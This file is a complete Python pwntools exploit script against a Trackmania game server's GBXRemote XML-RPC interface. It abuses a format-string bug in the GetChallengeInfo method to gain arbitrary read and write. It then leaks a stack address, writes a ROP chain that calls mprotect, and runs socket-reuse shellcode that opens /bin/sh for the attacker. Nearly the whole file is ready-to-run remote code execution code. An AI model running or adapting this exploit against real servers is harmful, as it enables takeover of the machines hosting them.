#!/usr/bin/env python3

import os
import shutil
import time
import random
import sys
from pwn import *


e = ELF("../Server/TrackmaniaServer")
context.binary = e
context.kernel = context.arch

HOST = (sys.argv[1:2] or ['localhost'])[0]
PORT = (sys.argv[2:3] or [5000])[0]

# Socket re-use shellcode
# <3 https://www.exploit-db.com/exploits/34060
shellcode = asm(f"""
// int 3
/* We use sys_dup(2) to get the previous attributed sockfd */
push 0x2;
pop ebx;
push 0x29;
pop eax;
int 0x80; //-> call dup(2)
dec eax;

/* Now EAX = our Socket File Descriptor */

mov esi, eax;

/* dup2(fd,0); dup2(fd,1); dup2(fd,2); */
xor    ecx,ecx;
push   esi;
pop    ebx;

.loop:
push   0x3f;
pop    eax;
int    0x80;
inc    ecx;
cmp    cl, 3;
jne    .loop;

// int 3

/* execve /bin/sh by ipv */
push 0xb;
pop eax;
cdq;
push edx;
xor esi, esi;
push esi;
push 0x68732f2f;
push 0x6e69622f;
mov ebx, esp;
xor ecx, ecx;
int 0x80
""")


handler = 0x80010000
p = remote(HOST, PORT)

# recieve and validate header the gbx header
data = p.recv(4)
headerLength = u32(data)

## header data, bytes of length n=headerLength
data = p.recv(headerLength)
header = data.decode() # decode bytes to string

## the header should equal "GBXRemote 2"
if header != "GBXRemote 2":
    print('Invalid header.')
    sys.exit(0)


def send_content(contents):
    global handler
    ## build the packet
    ### pack handler, 4 bytes int, big endian
    handlerBytes = p32(handler)

    ### pack method call, xml structure
    ### compile packet
    packet = bytes()
    #### packet length
    packetLen = len(contents)
    packet += p32(packetLen)
    #### handler
    packet += handlerBytes
    #### data
    packet += contents

    p.send(packet)

    ## recieve authentication response
    ### recieve response header, 8 bytes
    header = p.recv(8)
    #### unpack response size, 4 bytes int
    size = u32(header[:4])
    #### unpack handler, 4 bytes int
    responseHandler = u32(header[4:])
    ##### the response must have the same handler value
    if responseHandler != handler:
        print('Response handler does not match!')
        exit(0)
    #### recieve response data
    response = p.recv(size)
    handler += 1
    return response

def throw(format_string):
    contents = f"""
    <?xml version="1.0"?>
    <methodCall>
    <methodName>GetChallengeInfo</methodName>
    <params>
    <param>
    <value>{format_string}</value>
    </param>
    </params>
    </methodCall>
    """.encode()
    return send_content(contents)

def version():
    contents = f"""
    <?xml version="1.0"?>
    <methodCall>
    <methodName>GetVersion</methodName>
    </methodCall>
    """.encode()
    return send_content(contents)


g_argv_leak = 0x08c77494
g_heap_leak = 0x08cbafcc
g_heap_offset = 0x6d4f9
g_exit_code = 0x08cbaaa0
g_game_name = 0x08cda7e8

mux_initial_lsb = 0xb8 # (only true in gdb on my system)

offset_1 = 287 # 0xffffcb90: 0xffffcb98
offset_2 = 289 # 0xffffcb98: 0xffffcbb8  <--- this value is muxed
offset_3 = 297 # 0xffffcbb8: <dont care> <--- this points to target

last_target_addr = None

def set_target_addr(addr):
    global last_target_addr
    for i in range(4):
        # We may be able to skip the loop
        if last_target_addr is not None:
            if ((last_target_addr >> (8*i)) & 0xff) == ((addr >> (8*i)) & 0xff):
                continue

        count = len("Track '")
        # Target byte X of the muxer
        val = 0x100 + mux_initial_lsb + i - count
        s = f"%{val}d%{offset_1}$hhn"
        throw(s)

        # Write the address byte
        val = 0x100 + ((addr >> (8*i)) & 0xff) - count
        s = f"%{val}d%{offset_2}$hhn"
        throw(s)
    last_target_addr = addr


def write(addr, value):
    initial = len("Track '")
    log.info(f"WRITE(0x{addr:x}, {value})")

    assert len(value) <= 4
    for i, byte in enumerate(value):
        set_target_addr(addr + i)

        val = 0x100 + byte - initial
        s = f"%{val}d%{offset_3}$hhn"
        throw(s)

def write_one(addr, value):
    set_target_addr(addr)
    initial = len("Track '")
    log.info(f"WRITE(0x{addr:x}, {value})")
    value = u32(value)
    value -= initial

    s = f"%{value}d%{offset_3}$n"
    throw(s)


def read(addr):
    write(g_game_name, p32(addr))
    res = version()
    leak = u32(res.split(b"string>")[1][:-2][:4])
    assert leak != u32(b"TmFo"), "Leak is broken, aborting"
    return leak

def slow_calibrate():
    global mux_initial_lsb
    initial = len("Track '")
    s = f"%{g_game_name - initial}d%{offset_2}$n"
    throw(s)
    s = f"%{g_argv_leak - initial}d%{offset_3}$n"
    throw(s)
    res = version()
    leak = u32(res.split(b"string>")[1][:-2][:4])
    assert leak != u32(b"TmFo"), "Slow calibrate broken"
    mux_initial_lsb = (leak - 0x254) & 0xff

log.info("Calibrating... This will take ~10s, but saves a risky 16 bit bruteforce")
slow_calibrate()


argv = read(g_argv_leak)
log.info(f"Arb read confirmed to be working")
log.info(f"Received stack leak: {hex(argv)}")

main_ret = argv - 0x290
log.info(f"Overwriting        : {hex(main_ret)}")

rop_base = main_ret + 0x2bc + 4

rop = ROP(e)
ret = next(e.search(asm("ret;")))
int_80_ret = next(e.search(asm("int 0x80; ret;")))

rop.eax = constants.SYS_mprotect
rop.ebx = rop_base & 0xfffff000
rop.ecx = 0x3000
rop.edx = 0x7
rop.call(int_80_ret)
rop.call(rop.jmp_esp)

rop.raw(shellcode)

log.info(f"Writing rop chain @: {hex(rop_base)}")
data = rop.chain()
for i in range(0, len(data), 4):
    write(rop_base + i, data[i:i+4])

log.info("Triggering pivot, prepare for shell")
# 0x08064446: add esp, 0x2bc; ret;
write_one(main_ret, p32(0x08064446))

p.interactive()

p.close()
